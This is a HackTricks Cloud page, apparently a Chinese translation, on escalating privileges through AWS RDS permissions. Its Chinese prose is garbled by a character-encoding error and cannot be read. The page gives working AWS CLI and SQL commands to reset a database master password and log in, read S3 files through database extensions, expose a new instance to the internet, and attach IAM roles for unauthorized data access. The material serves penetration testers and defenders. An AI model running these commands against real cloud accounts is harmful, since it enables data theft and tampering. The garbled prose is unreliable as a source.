# AWS - RDS æƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## RDS - å…³ç³»å‹æ•°æ®åº“æœåŠ¡

æœ‰å…³RDSçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-databases/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-databases/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

æ‹¥æœ‰è¯¥æƒé™çš„æ”»å‡»è€…å¯ä»¥**ä¿®æ”¹ä¸»ç”¨æˆ·çš„å¯†ç **ï¼Œå¹¶ç™»å½•æ•°æ®åº“ï¼š
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
æ‚¨éœ€è¦èƒ½å¤Ÿ**è¿æ¥åˆ°æ•°æ®åº“**ï¼ˆå®ƒä»¬é€šå¸¸åªèƒ½ä»å†…éƒ¨ç½‘ç»œè®¿é—®ï¼‰ã€‚
{% endhint %}

**æ½œåœ¨å½±å“ï¼š** åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°æ•æ„Ÿä¿¡æ¯ã€‚

### rds-db:connect

æ ¹æ®[**æ–‡æ¡£**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html)ï¼Œæ‹¥æœ‰æ­¤æƒé™çš„ç”¨æˆ·å¯ä»¥è¿æ¥åˆ°DBå®ä¾‹ã€‚

### æ»¥ç”¨RDSè§’è‰²IAMæƒé™

#### Postgresqlï¼ˆAuroraï¼‰

{% hint style="success" %}
å¦‚æœè¿è¡Œ**`SELECT datname FROM pg_database;`**ï¼Œæ‚¨å‘ç°ä¸€ä¸ªåä¸º**`rdsadmin`**çš„æ•°æ®åº“ï¼Œæ‚¨å°±çŸ¥é“æ‚¨åœ¨**AWS postgresqlæ•°æ®åº“**å†…éƒ¨ã€‚
{% endhint %}

é¦–å…ˆï¼Œæ‚¨å¯ä»¥æ£€æŸ¥è¿™ä¸ªæ•°æ®åº“æ˜¯å¦å·²è¢«ç”¨æ¥è®¿é—®ä»»ä½•å…¶ä»–AWSæœåŠ¡ã€‚æ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹å·²å®‰è£…çš„æ‰©å±•æ¥æ£€æŸ¥è¿™ä¸€ç‚¹ï¼š
```sql
SELECT * FROM pg_extension;
```
å¦‚æœæ‚¨å‘ç°ç±»ä¼¼ **`aws_s3`** çš„å†…å®¹ï¼Œæ‚¨å¯ä»¥å‡è®¾è¿™ä¸ªæ•°æ®åº“å¯¹ S3 æœ‰**æŸç§è®¿é—®æƒé™**ï¼ˆè¿˜æœ‰å…¶ä»–æ‰©å±•ï¼Œå¦‚ **`aws_ml`** å’Œ **`aws_lambda`**ï¼‰ã€‚

æ­¤å¤–ï¼Œå¦‚æœæ‚¨æœ‰æƒé™è¿è¡Œ **`aws rds describe-db-clusters`**ï¼Œæ‚¨å¯ä»¥åœ¨ **`AssociatedRoles`** å­—æ®µä¸­çœ‹åˆ°**é›†ç¾¤æ˜¯å¦é™„åŠ äº†ä»»ä½• IAM è§’è‰²**ã€‚å¦‚æœæœ‰ï¼Œæ‚¨å¯ä»¥å‡è®¾æ•°æ®åº“å·²ç»**å‡†å¤‡å¥½è®¿é—®å…¶ä»– AWS æœåŠ¡**ã€‚æ ¹æ®**è§’è‰²çš„åç§°**ï¼ˆæˆ–è€…å¦‚æœæ‚¨èƒ½è·å–è§’è‰²çš„**æƒé™**ï¼‰ï¼Œæ‚¨å¯ä»¥**çŒœæµ‹**æ•°æ®åº“æœ‰å“ªäº›é¢å¤–çš„è®¿é—®æƒé™ã€‚

ç°åœ¨ï¼Œè¦**è¯»å–å­˜å‚¨æ¡¶å†…çš„æ–‡ä»¶**ï¼Œæ‚¨éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾„ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–ï¼š
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
å¦‚æœæ‚¨æ‹¥æœ‰**åŸå§‹ AWS å‡­è¯**ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥è®¿é—® S3 æ•°æ®ï¼š
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **æ— éœ€æ›´æ”¹ä»»ä½•å‚æ•°ç»„å˜é‡**å³å¯è®¿é—®S3ã€‚
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
åœ¨mysqlä¸­ï¼Œå¦‚æœä½ è¿è¡ŒæŸ¥è¯¢ **`SELECT User, Host FROM mysql.user;`** å¹¶ä¸”æœ‰ä¸€ä¸ªåä¸º **`rdsadmin`** çš„ç”¨æˆ·ï¼Œä½ å¯ä»¥å‡è®¾ä½ åœ¨ **AWS RDS mysqlæ•°æ®åº“** ä¸­ã€‚
{% endhint %}

åœ¨mysqlä¸­è¿è¡Œ **`show variables;`**ï¼Œå¦‚æœå˜é‡å¦‚ **`aws_default_s3_role`**ã€**`aurora_load_from_s3_role`**ã€**`aurora_select_into_s3_role`** æœ‰å€¼ï¼Œä½ å¯ä»¥å‡è®¾æ•°æ®åº“å·²å‡†å¤‡å¥½è®¿é—®S3æ•°æ®ã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ æœ‰æƒé™è¿è¡Œ **`aws rds describe-db-clusters`**ï¼Œä½ å¯ä»¥æ£€æŸ¥é›†ç¾¤æ˜¯å¦æœ‰ä»»ä½• **å…³è”è§’è‰²**ï¼ˆé€šå¸¸æ„å‘³ç€è®¿é—®AWSæœåŠ¡ï¼‰ã€‚

ç°åœ¨ï¼Œè¦**è¯»å–å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶**ï¼Œä½ éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾„ã€‚ä½ å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•è¯»å–ï¼š
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

æ‹¥æœ‰ `rds:AddRoleToDBCluster` å’Œ `iam:PassRole` æƒé™çš„æ”»å‡»è€…å¯ä»¥**å‘ç°æœ‰çš„ RDS å®ä¾‹æ·»åŠ æŒ‡å®šè§’è‰²**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**æ½œåœ¨å½±å“**ï¼šè®¿é—®æ•æ„Ÿæ•°æ®æˆ–æœªæˆæƒä¿®æ”¹ RDS å®ä¾‹ä¸­çš„æ•°æ®ã€‚
è¯·æ³¨æ„ï¼ŒæŸäº›æ•°æ®åº“éœ€è¦é¢å¤–é…ç½®ï¼Œä¾‹å¦‚ Mysqlï¼Œå®ƒè¿˜éœ€è¦åœ¨å‚æ•°ç»„ä¸­æŒ‡å®šè§’è‰² ARNã€‚

### `rds:CreateDBInstance`

ä»…å‡­è¿™ä¸ªæƒé™ï¼Œæ”»å‡»è€…å°±èƒ½åœ¨å·²å­˜åœ¨çš„**é›†ç¾¤å†…åˆ›å»ºä¸€ä¸ªæ–°å®ä¾‹**ï¼Œå¹¶ä¸”è¯¥é›†ç¾¤å·²ç»é™„åŠ äº†**IAM è§’è‰²**ã€‚ä»–å°†æ— æ³•æ›´æ”¹ä¸»ç”¨æˆ·å¯†ç ï¼Œä½†ä»–å¯èƒ½ä¼šå°†æ–°çš„æ•°æ®åº“å®ä¾‹æš´éœ²ç»™äº’è”ç½‘ï¼š
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
å¾…åŠäº‹é¡¹ï¼šæµ‹è¯•
{% endhint %}

æ‹¥æœ‰ `rds:CreateDBInstance` å’Œ `iam:PassRole` æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„ RDS å®ä¾‹å¹¶é™„åŠ æŒ‡å®šè§’è‰²**ã€‚æ”»å‡»è€…éšåå¯èƒ½**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
é™„åŠ çš„è§’è‰²/å®ä¾‹é…ç½®æ–‡ä»¶çš„ä¸€äº›è¦æ±‚ï¼ˆæ¥æº[**è¿™é‡Œ**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)ï¼‰ï¼š

* é…ç½®æ–‡ä»¶å¿…é¡»å­˜åœ¨äºæ‚¨çš„è´¦æˆ·ä¸­ã€‚
* é…ç½®æ–‡ä»¶å¿…é¡»æœ‰ä¸€ä¸ª IAM è§’è‰²ï¼ŒAmazon EC2 æœ‰æƒé™æ‰¿æ‹…ã€‚
* å®ä¾‹é…ç½®æ–‡ä»¶åå’Œå…³è”çš„ IAM è§’è‰²åå¿…é¡»ä»¥å‰ç¼€ `AWSRDSCustom` å¼€å¤´ã€‚
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
**æ½œåœ¨å½±å“**ï¼šè®¿é—®æ•æ„Ÿæ•°æ®æˆ–æœªç»æˆæƒä¿®æ”¹ RDS å®ä¾‹ä¸­çš„æ•°æ®ã€‚

### `rds:AddRoleToDBInstance`, `iam:PassRole`

æ‹¥æœ‰ `rds:AddRoleToDBInstance` å’Œ `iam:PassRole` æƒé™çš„æ”»å‡»è€…å¯ä»¥**å‘ç°æœ‰ RDS å®ä¾‹æ·»åŠ æŒ‡å®šè§’è‰²**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
DB å®ä¾‹å¿…é¡»ä½äºé›†ç¾¤å¤–éƒ¨
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**æ½œåœ¨å½±å“**ï¼šè®¿é—®æ•æ„Ÿæ•°æ®æˆ–æœªç»æˆæƒä¿®æ”¹ RDS å®ä¾‹ä¸­çš„æ•°æ®ã€‚

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
